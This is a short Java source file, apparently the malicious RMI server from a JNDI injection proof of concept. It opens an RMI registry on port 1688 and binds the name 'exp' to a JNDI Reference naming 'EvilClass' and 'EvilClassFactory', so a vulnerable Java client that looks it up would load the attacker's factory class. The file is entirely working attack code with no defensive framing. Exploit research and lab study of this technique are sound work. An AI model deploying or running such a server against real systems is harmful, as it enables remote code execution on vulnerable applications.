

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class AServer {
    public static void main(String args[]) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1688);
        Reference refObj = new Reference("EvilClass", "EvilClassFactory", "test");
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
        System.out.println("[*]Binding 'exp' to 'rmi://127.0.0.1:1688/exp'");
        registry.bind("exp", refObjWrapper);
    }
}